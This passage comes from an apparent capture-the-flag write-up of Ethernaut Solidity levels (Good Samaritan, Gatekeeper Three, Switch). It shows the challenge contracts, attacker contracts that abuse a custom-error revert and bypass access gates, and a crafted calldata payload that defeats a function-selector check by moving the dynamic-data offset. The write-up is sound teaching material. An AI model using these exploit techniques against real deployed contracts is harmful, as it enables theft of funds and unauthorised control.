+</span><span>}
+</span><span>contract Attacker {
+</span><span>    error NotEnoughBalance();
+</span><span>    IGoodSamaritan _GoodSamaritan;
+</span><span>    constructor (address _addr){
+</span><span>        _GoodSamaritan = IGoodSamaritan(_addr);
+</span><span>    }
+</span><span>    function attack () public {
+</span><span>        _GoodSamaritan.requestDonation(); 
+</span><span>    }
+</span><span>    function notify(uint256 amount) pure external {
+</span><span>        if(amount == 10){
+</span><span>			revert NotEnoughBalance();
+</span><span>        }
+</span><span>    }
+</span><span>}
+</span></code></pre><h2 id=gatekeeper-three>Gatekeeper Three</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract SimpleTrick {
+</span><span>  GatekeeperThree public target;
+</span><span>  address public trick;
+</span><span>  uint private password = block.timestamp;
+</span><span>
+</span><span>  constructor (address payable _target) {
+</span><span>    target = GatekeeperThree(_target);
+</span><span>  }
+</span><span>    
+</span><span>  function checkPassword(uint _password) public returns (bool) {
+</span><span>    if (_password == password) {
+</span><span>      return true;
+</span><span>    }
+</span><span>    password = block.timestamp;
+</span><span>    return false;
+</span><span>  }
+</span><span>    
+</span><span>  function trickInit() public {
+</span><span>    trick = address(this);
+</span><span>  }
+</span><span>    
+</span><span>  function trickyTrick() public {
+</span><span>    if (address(this) == msg.sender && address(this) != trick) {
+</span><span>      target.getAllowance(password);
+</span><span>    }
+</span><span>  }
+</span><span>}
+</span><span>
+</span><span>contract GatekeeperThree {
+</span><span>  address public owner;
+</span><span>  address public entrant;
+</span><span>  bool public allowEntrance;
+</span><span>
+</span><span>  SimpleTrick public trick;
+</span><span>
+</span><span>  function construct0r() public {
+</span><span>      owner = msg.sender;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateOne() {
+</span><span>    require(msg.sender == owner);
+</span><span>    require(tx.origin != owner);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateTwo() {
+</span><span>    require(allowEntrance == true);
+</span><span>    _;
+</span><span>  }
+</span><span>
+</span><span>  modifier gateThree() {
+</span><span>    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+</span><span>      _;
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  function getAllowance(uint _password) public {
+</span><span>    if (trick.checkPassword(_password)) {
+</span><span>        allowEntrance = true;
+</span><span>    }
+</span><span>  }
+</span><span>
+</span><span>  function createTrick() public {
+</span><span>    trick = new SimpleTrick(payable(address(this)));
+</span><span>    trick.trickInit();
+</span><span>  }
+</span><span>
+</span><span>  function enter() public gateOne gateTwo gateThree {
+</span><span>    entrant = tx.origin;
+</span><span>  }
+</span><span>
+</span><span>  receive () external payable {}
+</span><span>}
+</span></code></pre><p>SimpleTrick is a sub-contract of GateKeeperThree. Nothing new here.<pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>... // all code from challenge source
+</span><span>contract gateBreaker {
+</span><span>    GatekeeperThree _GatekeeperThree;
+</span><span>    constructor (address payable _addr) {
+</span><span>        _GatekeeperThree = GatekeeperThree(_addr); 
+</span><span>    }
+</span><span>    function exp1() external {
+</span><span>        _GatekeeperThree.createTrick();
+</span><span>        _GatekeeperThree.construct0r();
+</span><span>    }
+</span><span>    // Dont forget to transfer >0.001 eth to gateKeeper
+</span><span>    function exp2(uint pass) external {
+</span><span>        _GatekeeperThree.getAllowance(pass);
+</span><span>        _GatekeeperThree.enter();
+</span><span>    }
+</span><span>    fallback() external { }
+</span><span>}
+</span></code></pre><h2 id=switch>Switch</h2><pre class=language-solidity data-lang=solidity style=background:#2e3440;color:#d8dee9><code class=language-solidity data-lang=solidity><span>// SPDX-License-Identifier: MIT
+</span><span>pragma solidity ^0.8.0;
+</span><span>
+</span><span>contract Switch {
+</span><span>    bool public switchOn; // switch is off
+</span><span>    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));
+</span><span>
+</span><span>     modifier onlyThis() {
+</span><span>        require(msg.sender == address(this), "Only the contract can call this");
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>    modifier onlyOff() {
+</span><span>        // we use a complex data type to put in memory
+</span><span>        bytes32[1] memory selector;
+</span><span>        // check that the calldata at position 68 (location of _data)
+</span><span>        assembly {
+</span><span>            calldatacopy(selector, 68, 4) // grab function selector from calldata
+</span><span>        }
+</span><span>        require(
+</span><span>            selector[0] == offSelector,
+</span><span>            "Can only call the turnOffSwitch function"
+</span><span>        );
+</span><span>        _;
+</span><span>    }
+</span><span>
+</span><span>    function flipSwitch(bytes memory _data) public onlyOff {
+</span><span>        (bool success, ) = address(this).call(_data);
+</span><span>        require(success, "call failed :(");
+</span><span>    }
+</span><span>
+</span><span>    function turnSwitchOn() public onlyThis {
+</span><span>        switchOn = true;
+</span><span>    }
+</span><span>
+</span><span>    function turnSwitchOff() public onlyThis {
+</span><span>        switchOn = false;
+</span><span>    }
+</span><span>
+</span><span>}
+</span></code></pre><p>about how CALLDATA is encoded: <a href=https://docs.soliditylang.org/en/v0.8.17/abi-spec.html#use-of-dynamic-types>official doc</a>, <a href=https://blog.softbinator.com/solving-ethernaut-level-29-switch/>others writeup</a><p>Briefly saying, Calldata Encoding Essentials for Dynamic Types, including string, bytes and arrays, encode using <code>offset - length - data</code> segment to encoding. Allowing us to bypass the check by modifying the offset.<p>by moving the data content(length and value) after the address param(to):<pre class=language-js data-lang=js style=background:#2e3440;color:#d8dee9><code class=language-js data-lang=js><span style=color:#81a1c1>await </span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>to</span><span style=color:#eceff4>: </span><span>contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span>data</span><span style=color:#eceff4>:</span><span style=color:#a3be8c>"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"</span><span>})
+</span></code></pre></div></div></section>
